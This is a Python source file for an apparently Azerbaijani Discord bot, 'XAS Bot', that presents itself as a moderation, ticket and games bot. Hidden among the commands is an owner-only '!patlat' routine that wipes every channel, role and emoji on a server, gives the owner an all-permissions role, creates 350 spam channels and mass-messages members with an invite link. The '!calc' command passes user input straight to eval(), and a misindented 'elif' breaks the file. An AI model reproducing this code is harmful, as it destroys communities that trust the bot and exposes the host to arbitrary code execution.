import discord
from discord.ext import commands
import random
import asyncio
import os
import time
from flask import Flask
from threading import Thread

# ==========================================
# 1. 7/24 AKTİVLİK ÜÇÜN FLASK SERVERİ
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "XAS Bot tam gücü ilə 7/24 aktivdir və işləyir!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ==========================================
# 2. BOTUN İNTENTLƏRİ VƏ PARAMETRLƏRİ
# ==========================================
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.presences = True
intents.voice_states = True

bot = commands.Bot(command_prefix="!", intents=intents)

SAHIB_ID = 641014966312501259
GUVENLI_SERVER_ID = 1520692621964738722
XAS_COLOR = discord.Color.from_rgb(20, 24, 33)

user_message_counts = {}
user_last_message_time = {}
user_xp = {}
user_warns = {}

# ==========================================
# 3. BOT HAZIR OLDUĞUNDA İŞLƏYƏN EVENT
# ==========================================
@bot.event
async def on_ready():
    print("--------------------------------------------------")
    print(f"Botun adı: {bot.user.name}")
    print(f"Botun ID-si: {bot.user.id}")
    print("Status: Bütün sistemlər tam güclə aktivdir, Sahib!")
    print("--------------------------------------------------")
    await bot.change_presence(activity=discord.Game(name="!panel | XAS Bot Systems"))

# ==========================================
# 4. WEBHOOK VƏ ANTİ-SPAM/QORUMA SİSTEMİ
# ==========================================
async def send_webhook_log(guild, title, description, color=0xff0000):
    try:
        log_chan = discord.utils.get(guild.text_channels, name="xas-log")
        if not log_chan:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
            }
            log_chan = await guild.create_text_channel("xas-log", overwrites=overwrites)
        
        webhooks = await log_chan.webhooks()
        webhook = webhooks[0] if webhooks else await log_chan.create_webhook(name="XAS Security Webhook")
        
        embed = discord.Embed(title=title, description=description, color=color, timestamp=discord.utils.utcnow())
        await webhook.send(embed=embed, username="XAS Security", avatar_url="https://i.imgur.com/AfFp7pu.png")
    except:
        pass

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    content_lower = message.content.lower()
    yasakli_kelimeler = ["/tag", "y1z", "g4r", "g3r", "discord.gg/"]
    for kelime in yasakli_kelimeler:
        if kelime in content_lower and message.author.id != SAHIB_ID:
            try:
                await message.delete()
                await send_webhook_log(
                    message.guild, 
                    "🚨 Qadağan olunmuş söz / link bloklandı!", 
                    f"**İstifadəçi:** {message.author.mention} (`{message.author.id}`)\n**Kanal:** {message.channel.mention}\n**Mesaj:** `{message.content}`"
                )
                return
            except:
                pass

    author_id = message.author.id
    current_xp = user_xp.get(author_id, {"xp": 0, "level": 1})
    current_xp["xp"] += random.randint(10, 25)
    needed_xp = current_xp["level"] * 150

    if current_xp["xp"] >= needed_xp:
        current_xp["level"] += 1
        current_xp["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}! Səviyyə atladın: **Level {current_xp['level']}**")
        except:
            pass
    user_xp[author_id] = current_xp

    await bot.process_commands(message)

    current_time = time.time()
    if author_id in user_last_message_time:
        diff = current_time - user_last_message_time[author_id]
        if diff < 1.0:
            count = user_message_counts.get(author_id, 0) + 1
            user_message_counts[author_id] = count
            if count >= 4:
                try:
                    await message.delete()
                    await send_webhook_log(
                        message.guild, 
                        "⚠️ Chat Spam Bloklandı!", 
                        f"**İstifadəçi:** {message.author.mention} çox sürətli mesaj yazaraq spam etdi və mesajı silindi."
                    )
                except:
                    pass
        else:
            user_message_counts[author_id] = 1
    else:
        user_message_counts[author_id] = 1
    user_last_message_time[author_id] = current_time

@bot.event
async def on_member_join(member):
    if member.bot and member.guild.id != GUVENLI_SERVER_ID:
        try:
            await member.ban(reason="Təhlükəsizlik: İcazəsiz bot girişi bloklandı.")
            await send_webhook_log(
                member.guild, 
                "🤖 İcazəsiz Bot Bloklandı!", 
                f"**Bot:** {member.mention} (`{member.name}`) serverə qatılmağa çalışdı və avtomatik ban olundu."
            )
        except:
            pass

# ==========================================
# 5. KÜTLƏVİ KANAL VƏ İDARƏETMƏ ƏMRLƏRİ
# ==========================================
@bot.command(name="kilitver", aliases=["lockall"])
async def lockall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        except:
            pass
    await ctx.send("✅ Bütün kanallar kilitləndi!")

@bot.command(name="kilitac", aliases=["unlockall"])
async def unlockall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=True)
        except:
            pass
    await ctx.send("✅ Bütün kanalların kilidi açıldı!")

@bot.command(name="gizlet", aliases=["hideall"])
async def hideall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, view_channel=False)
        except:
            pass
    await ctx.send("✅ Bütün kanallar gizlətildi!")

@bot.command(name="goster", aliases=["unhideall"])
async def unhideall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, view_channel=True)
        except:
            pass
    await ctx.send("✅ Bütün kanallar göstərildi!")

# ==========================================
# 6. MODERASİYA VƏ ROL ƏMRLƏRİ
# ==========================================
@bot.command(name="rolver", aliases=["giverole"])
async def giverole_cmd(ctx, member: discord.Member, *, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ {member.mention} istifadəçisinə `{role.name}` rolu verildi.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="rolal", aliases=["removerole"])
async def removerole_cmd(ctx, member: discord.Member, *, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ {member.mention} istifadəçisindən `{role.name}` rolu alındı.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="mute")
async def mute_cmd(ctx, member: discord.Member, *, reason="Səbəb yoxdur"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not muted_role:
        try:
            muted_role = await ctx.guild.create_role(name="Muted")
            for channel in ctx.guild.channels:
                await channel.set_permissions(muted_role, send_messages=False, speak=False)
        except:
            pass
    try:
        await member.add_roles(muted_role, reason=reason)
        await ctx.send(f"🔇 {member.mention} muted edildi.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="unmute")
async def unmute_cmd(ctx, member: discord.Member):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if muted_role and muted_role in member.roles:
        await member.remove_roles(muted_role)
        await ctx.send(f"🔊 {member.mention} mute-u qaldırıldı.")
    else:
        await ctx.send("❌ Bu şəxs muted deyil.")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.ban_members:
        return
    try:
        await member.ban(reason=reason)
        await ctx.send(f"🔨 {member.mention} ban olundu.")
    except:
        await ctx.send("❌ Xəta.")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    try:
        await member.kick(reason=reason)
        await ctx.send(f"👢 {member.mention} qovuldu.")
    except:
        await ctx.send("❌ Xəta.")

@bot.command(name="warn")
async def warn_cmd(ctx, member: discord.Member, *, reason="Səbəb yoxdur"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    warn_list = user_warns.get(member.id, [])
    warn_list.append(reason)
    user_warns[member.id] = warn_list
    await ctx.send(f"⚠️ {member.mention} xəbərdar edildi ({len(warn_list)} warn).")
    if len(warn_list) >= 3:
        try:
            await member.kick(reason="3 warn limiti.")
        except:
            pass

@bot.command(name="warns")
async def warns_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    warn_list = user_warns.get(m.id, [])
    if not warn_list:
        await ctx.send(f"✨ {m.name} istifadəçisinin warnı yoxdur.")
        return
    reasons = "\n".join([f"{i+1}. {r}" for i, r in enumerate(warn_list)])
    embed = discord.Embed(title=f"{m.name} — Warn Siyahısı", description=reasons, color=XAS_COLOR)
    await ctx.send(embed=embed)

# ==========================================
# 7. İNTERAKTİV PANEL VƏ MƏLUMATLAR
# ==========================================
class ActionButtons(discord.ui.View):
    def __init__(self, category):
        super().__init__(timeout=None)
        if category == "Xidmət və Məhsullar":
            self.add_item(discord.ui.Button(label="🛒 Qiymət Cədvəli", style=discord.ButtonStyle.primary, custom_id="btn_prices"))
            self.add_item(discord.ui.Button(label="📦 Məhsul Siyahısı", style=discord.ButtonStyle.secondary, custom_id="btn_products"))
        elif category == "Kütləvi İdarəetmə":
            self.add_item(discord.ui.Button(label="🔒 Kanalları Kilidlə", style=discord.ButtonStyle.danger, custom_id="btn_lock"))
            self.add_item(discord.ui.Button(label="🔓 Kilidləri Aç", style=discord.ButtonStyle.success, custom_id="btn_unlock"))
            self.add_item(discord.ui.Button(label="👁️ Kanalları Gizlət", style=discord.ButtonStyle.secondary, custom_id="btn_hide"))
        elif category == "Əsas Moderasiya":
            self.add_item(discord.ui.Button(label="🛡️ Ban / Kick Əmrləri", style=discord.ButtonStyle.danger, custom_id="btn_mod_info"))
            self.add_item(discord.ui.Button(label="⚠️ Warn Sistemi", style=discord.ButtonStyle.secondary, custom_id="btn_warn_info"))
        elif category == "Əyləncə və Oyunlar":
            self.add_item(discord.ui.Button(label="🎲 Zar At", style=discord.ButtonStyle.primary, custom_id="btn_roll"))
            self.add_item(discord.ui.Button(label="💻 Hack Et", style=discord.ButtonStyle.danger, custom_id="btn_hack"))
            self.add_item(discord.ui.Button(label="🎰 Slot Oyna", style=discord.ButtonStyle.success, custom_id="btn_slot"))
        elif category == "Çekiliş və Ticket":
            self.add_item(discord.ui.Button(label="🎫 Ticket Aç", style=discord.ButtonStyle.success, custom_id="open_ticket"))
            self.add_item(discord.ui.Button(label="🎁 Çekiliş Qaydaları", style=discord.ButtonStyle.primary, custom_id="btn_giveaway_info"))

    @discord.ui.button(label="🏠 Ana Menyuya Qayıt", style=discord.ButtonStyle.secondary, row=1, custom_id="btn_home")
    async def go_home(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(
            title="XAS — İDARƏETMƏ PANELİ", 
            description="--------------------------------------------------\nAşağıdakı menyudan idarə etmək istədiyiniz bölməni seçin.\n--------------------------------------------------", 
            color=XAS_COLOR
        )
        await interaction.response.edit_message(embed=embed, view=PanelView())

class PanelSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Xidmət və Məhsullar", description="Cari qiymətlər və xidmət məlumatları.", emoji="🛒"),
            discord.SelectOption(label="Kütləvi İdarəetmə", description="Bütün kanalları kilidlə, aç və ya gizlət.", emoji="⚡"),
            discord.SelectOption(label="Əsas Moderasiya", description="Ban, kick, mute və warn sistemi.", emoji="🛡️"),
            discord.SelectOption(label="Əyləncə və Oyunlar", description="Zar, hack, slot və əyləncə əmrləri.", emoji="💻"),
            discord.SelectOption(label="Çekiliş və Ticket", description="Dəstək yarat və çekiliş idarə et.", emoji="🎫")
        ]
        super().__init__(placeholder="Menyudan bölmə seçin...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        cat = self.values[0]
        descriptions = {
            "Xidmət və Məhsullar": "🛒 **Xidmət və Məhsullar Bölməsi**\n\nBu paneldən server xidmətləri, qiymətlər və aktiv məhsullar haqqında ətraflı məlumat əldə edə bilərsiniz.\n\n*Aşağıdakı düymələrdən əməliyyat seçin:*",
            "Kütləvi İdarəetmə": "⚡ **Kütləvi İdarəetmə Paneli**\n\nServerdəki bütün kanalları tək kliklə idarə edin. Kilidləyə, kilidini aça və ya hamısını gizlədə bilərsiniz.\n\n*Aşağıdakı düymələrdən əməliyyat seçin:*",
            "Əsas Moderasiya": "🛡️ **Əsas Moderasiya Paneli**\n\nServer təhlükəsizliyini qorumaq üçün istifadə olunan ban, kick, mute və warn əmrlərinin idarə mərkəzidir.\n\n*Aşağıdakı düymələrdən əməliyyat seçin:*",
            "Əyləncə və Oyunlar": "💻 **Əyləncə və Oyunlar Paneli**\n\nÜzvlərin vaxt əyləncəli keçirməsi üçün zar, hack simulyasiyası, slot və digər oyun düymələri.\n\n*Aşağıdakı düymələrdən əməliyyat seçin:*",
            "Çekiliş və Ticket": "🎫 **Çekiliş və Ticket Paneli**\n\nİstifadəçilərin dəstək alması üçün ticket açma sistemi və aktiv çekiliş idarəetmə mərkəzi.\n\n*Aşağıdakı düymələrdən əməliyyat seçin:*"
        }

        embed = discord.Embed(
            title=f"XAS — {cat.upper()}", 
            description=f"--------------------------------------------------\n{descriptions.get(cat, 'Məlumat tapılmadı.')}\n--------------------------------------------------", 
            color=XAS_COLOR
        )
        await interaction.response.edit_message(embed=embed, view=ActionButtons(cat))

class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(PanelSelect())

@bot.command(name="panel", aliases=["menu"])
async def panel_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(
        title="XAS — İDARƏETMƏ PANELİ", 
        description="--------------------------------------------------\nAşağıdakı menyudan idarə etmək istədiyiniz bölməni seçin.\n--------------------------------------------------", 
        color=XAS_COLOR
    )
    await ctx.send(embed=embed, view=PanelView())

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or "custom_id" not in interaction.data:
        return

    custom_id = interaction.data.get("custom_id")
    
    if custom_id == "open_ticket":
        guild = interaction.guild
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }
        for role in guild.roles:
            if role.permissions.administrator:
                overwrites[role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        channel_name = f"ticket-{interaction.user.name.lower()}"
        existing = discord.utils.get(guild.text_channels, name=channel_name)
        if existing:
            await interaction.response.send_message(f"Açıq ticketiniz var: {existing.mention}", ephemeral=True)
            return

        ticket_chan = await guild.create_text_channel(channel_name, overwrites=overwrites)
        embed = discord.Embed(title="XAS Dəstək Sistemi", description="Müraciətiniz qəbul edildi. Bağlamaq üçün `!close` yazın.", color=XAS_COLOR)
        await ticket_chan.send(embed=embed)
        await interaction.response.send_message(f"Ticket yaradıldı: {ticket_chan.mention}", ephemeral=True)
    
    elif custom_id == "btn_lock":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, send_messages=False)
            except:
                pass
        await interaction.response.send_message("✅ Bütün kanallar kilitləndi!", ephemeral=True)

    elif custom_id == "btn_unlock":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, send_messages=True)
            except:
                pass
        await interaction.response.send_message("✅ Bütün kanalların kilidi açıldı!", ephemeral=True)

    elif custom_id == "btn_hide":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, view_channel=False)
            except:
                pass
        await interaction.response.send_message("✅ Bütün kanallar gizlətildi!", ephemeral=True)

    elif custom_id == "btn_roll":
        await interaction.response.send_message(f"🎲 Zar nəticəsi: **{random.randint(1, 6)}**", ephemeral=True)

    elif custom_id == "btn_hack":
        await interaction.response.send_message(f"💻 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Hədəf sındırıldı!", ephemeral=True)

    elif custom_id == "btn_slot":
        semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
        c1, c2, c3 = random.choices(semboller, k=3)
        res = "🎰 Jackpot qazandın!" if c1 == c2 == c3 else "🎰 Uduzdun."
        await interaction.response.send_message(f"{c1} | {c2} | {c3}\n{res}", ephemeral=True)

    elif custom_id == "btn_prices":
        await interaction.response.send_message("🛒 **Cari Qiymətlər:**\n- VIP Rol: 5 AZN\n- Xüsusi Bot: 10 AZN", ephemeral=True)

    elif custom_id == "btn_products":
        await interaction.response.send_message("📦 **Məhsullar:** Bot xidmətləri və dizayn paketləri aktivdir.", ephemeral=True)

        elif custom_id == "btn_mod_info":
        await interaction.response.send_message("🛡️ **Moderasiya Qaydası:** `!ban @istifadəçi`, `!kick @istifadəçi`, `!mute @istifadəçi` əmrlərindən istifadə edin.", ephemeral=True)

    elif custom_id == "btn_warn_info":
        await interaction.response.send_message("⚠️ **Warn Sistemi:** `!warn @istifadəçi səbəb` yazaraq xəbərdarlıq verə bilərsiniz. 3 warn avtomatik kickdir.", ephemeral=True)

    elif custom_id == "btn_giveaway_info":
        await interaction.response.send_message("🎁 **Çekiliş Əmri:** `!giveaway 1h HədiyyəAdı` şəklində istifadə olunur.", ephemeral=True)

@bot.command(name="ticketkur")
async def ticketkur_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="XAS Dəstək Xidməti", description="Dəstək yaratmaq üçün düyməyə basın.", color=XAS_COLOR)
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="🎫 Dəstək Tələb Et (Ticket Aç)", style=discord.ButtonStyle.success, custom_id="open_ticket"))
    await ctx.send(embed=embed, view=view)

@bot.command(name="close")
async def close_cmd(ctx):
    if "ticket" in ctx.channel.name:
        await ctx.send("Ticket 3 saniyə sonra bağlanacaq.")
        await asyncio.sleep(3)
        try:
            await ctx.channel.delete()
        except:
            pass
    else:
        await ctx.send("Bu komanda yalnız ticket kanallarında işləyir.")

# ==========================================
# 8. SƏVİYYƏ VƏ AKTİVLİK STATİSTİKASI
# ==========================================
@bot.command(name="level", aliases=["lvl"])
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_xp.get(m.id, {"xp": 0, "level": 1})
    embed = discord.Embed(title=f"{m.name} — Səviyyə Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Səviyyə", value=str(data["level"]), inline=True)
    embed.add_field(name="XP", value=str(data["xp"]), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="aktivite", aliases=["stats", "durum"])
async def aktivite_cmd(ctx):
    guild = ctx.guild
    voice_members = sum(len(vc.members) for vc in guild.voice_channels)
    total_members = guild.member_count
    
    embed = discord.Embed(title=f"📊 {guild.name} — Canlı Aktivlik Statistikası", color=XAS_COLOR)
    embed.add_field(name="Ümumi Üzv Sayı", value=str(total_members), inline=True)
    embed.add_field(name="Səs Kanallarında Aktiv", value=str(voice_members), inline=True)
    embed.add_field(name="Aktiv Text Kanalları", value=str(len(guild.text_channels)), inline=True)
    embed.set_footer(text="XAS Bot Canlı İzləmə Sistemi")
    await ctx.send(embed=embed)

@bot.command(name="giveaway")
async def giveaway_cmd(ctx, time_str: str, *, prize: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    seconds = 0
    if time_str.endswith("s"):
        seconds = int(time_str[:-1])
    elif time_str.endswith("m"):
        seconds = int(time_str[:-1]) * 60
    elif time_str.endswith("h"):
        seconds = int(time_str[:-1]) * 3600
    else:
        await ctx.send("Vaxt formatı: `10s`, `5m`, `1h`")
        return

    embed = discord.Embed(title="🎁 BÖYÜK ÇƏKİLİŞ 🎁", description=f"Hədiyyə: **{prize}**\nQatılmaq üçün reaksiyaya basın!", color=XAS_COLOR)
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎁")
    await asyncio.sleep(seconds)

    new_msg = await ctx.channel.fetch_message(msg.id)
    users = []
    for reaction in new_msg.reactions:
        if str(reaction.emoji) == "🎁":
            async for user in reaction.users():
                if not user.bot:
                    users.append(user)

    if users:
        winner = random.choice(users)
        await ctx.send(f"🎉 Təbriklər {winner.mention}! Çəkilişi qazandın: **{prize}**")
    else:
        await ctx.send("❌ Çəkilişə qatılan olmadı.")

# ==========================================
# 9. URL, OYUNLAR VƏ ƏYLƏNCƏ
# ==========================================
@bot.command(name="url")
async def url_cmd(ctx):
    try:
        invites = await ctx.guild.invites()
        uses = sum(inv.uses for inv in invites if inv.code == ctx.guild.vanity_url_code) if ctx.guild.vanity_url_code else 0
    except:
        uses = "Mövcud deyil"

    embed = discord.Embed(title="🔗 Server URL və Webhook Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Server Adı", value=ctx.guild.name, inline=True)
    embed.add_field(name="Vanity URL", value=f"`{ctx.guild.vanity_url_code}`" if ctx.guild.vanity_url_code else "Yoxdur", inline=True)
    embed.add_field(name="URL İstifadə Sayı (Clicks)", value=f"📈 **{uses}** dəfə istifadə olundu", inline=False)
    embed.set_footer(text="Webhook İnteqrasiyası Aktivdir")
    await ctx.send(embed=embed)

@bot.command(name="sex")
async def sex_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    kiss_gifs = [
        "https://media1.giphy.com/media/Gogh8zC1TjF0c/giphy.gif",
        "https://media.giphy.com/media/2v170e71aanfi/giphy.gif",
        "https://media.giphy.com/media/3og0IPxMM0erATueVW/giphy.gif",
        "https://media3.giphy.com/media/l4FGJfzuV6W1N2kSY/giphy.gif",
        "https://media.giphy.com/media/109ltuoSQT212w/giphy.gif"
    ]
    embed = discord.Embed(title=f"❤️ {ctx.author.name} və {m.name} romantik anlar yaşayır! ✨", color=XAS_COLOR)
    embed.set_image(url=random.choice(kiss_gifs))
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping_cmd(ctx):
    await ctx.send(f"🏓 Botun Gecikməsi: `{round(bot.latency * 1000)}ms`")

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yazıpara"])
async def coinflip_cmd(ctx):
    await ctx.send(f"🪙 Qəpik: **{random.choice(['Yazı', 'Para'])}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🌈 {m.name} uyğunluq: **{random.randint(0, 100)}**%")

@bot.command(name="handsome", aliases=["yaraşıqlı"])
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 {m.name} yaraşıqlılıq: **{random.randint(50, 100)}**%")

@bot.command(name="love", aliases=["sevgi"])
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"❤️ {member1.mention} və {m2.mention} sevgi uyğunluğu: **{random.randint(0, 100)}**%")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 {m.name} hədəfə alındı, sistemə sızılır...")
    await asyncio.sleep(1.5)
    await msg.edit(content=f"💻 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Şifrə sındırıldı!")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
    c1, c2, c3 = random.choices(semboller, k=3)
    if c1 == c2 == c3:
        await ctx.send(f"{c1} | {c2} | {c3} \n🎰 Jackpot qazandın!")
    else:
        await ctx.send(f"{c1} | {c2} | {c3} \n🎰 Uduzdun.")

@bot.command(name="8ball")
async def eight_ball_cmd(ctx, *, soru):
    cavablar = ["Bəli", "Xeyr", "Kəsinliklə", "Şübhəlidir", "Mümkün deyil", "Əlbəttə"]
    await ctx.send(f"🎱 Sual: {soru}\nCavab: **{random.choice(cavablar)}**")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        netice = eval(expression)
        await ctx.send(f"🧮 Nəticə: **{netice}**")
    except:
        await ctx.send("❌ Riyazi ifadə səhvdir.")

@bot.command(name="joke", aliases=["zarafat"])
async def joke_cmd(ctx):
    zarafatlar = [
        "Proqramçıların niyə uşaqları az olur? Çünki gecələr patch yükləyirlər.",
        "Kompüter nə vaxt üşüyər? Pəncərəni (Windows) açıq qoyanda."
    ]
    await ctx.send(f"😂 {random.choice(zarafatlar)}")

@bot.command(name="rps", aliases=["daşqayçı"])
async def rps_cmd(ctx, choice: str):
    user_c = choice.lower()
    choices = ["daş", "kağız", "qayçı"]
    if user_c not in choices:
        await ctx.send("Zəhmət olmasa seçin: `daş`, `kağız`, `qayçı`")
        return
    bot_c = random.choice(choices)
    await ctx.send(f"Sənin seçimin: **{user_c}** | Botun seçimi: **{bot_c}**")

@bot.command(name="poll", aliases=["sorgu"])
async def poll_cmd(ctx, *, soru):
    embed = discord.Embed(title="📊 Səsvermə Anketi", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorğunu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

# ==========================================
# 10. !PATLAT (RUHUM-SHDI VƏ WEBHOOK SİSTEMİ)
# ==========================================
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return
    
    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ Təhlükəsizlik xəbərdarlığı: Bu qorunan serverdir!")
        return

    await ctx.send("💥 RUHUM-SHDI kütləvi sürətli sistem əməliyyatı başladıldı!")
    
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
        except:
            pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    for role in guild.roles:
        if role != guild.default_role and not role.managed:
            try:
                await role.delete()
            except:
                pass

    try:
        new_role = await guild.create_role(
            name="discord.gg/aga",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(new_role)
    except:
        pass

    async def create_and_spam(i):
        try:
            channel = await guild.create_text_channel(f"ruhum-shdi-{i}")
            webhook = await channel.create_webhook(name="XAS Webhook")
            for _ in range(50):
                await webhook.send("@everyone discord.gg/aga yaz gır oql")
                await channel.send("@everyone discord.gg/aga yaz gır oql")
        except:
            pass

    tasks = [create_and_spam(i) for i in range(1, 351)]
    await asyncio.gather(*tasks)
            
    for member in guild.members:
        if not member.bot and member.id != SAHIB_ID:
            try:
                await member.send("discord.gg/aga Server dağıtıldı, tez gəl!")
            except:
                pass

# ==========================================
# 11. BOTUN İŞƏ DÜŞMƏSİ (RUN)
# ==========================================
if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
    else:
        print("❌ XƏTA: 'DISCORD_TOKEN' tapılmadı! Replit Secrets bölməsinə tokeni əlavə edin.")
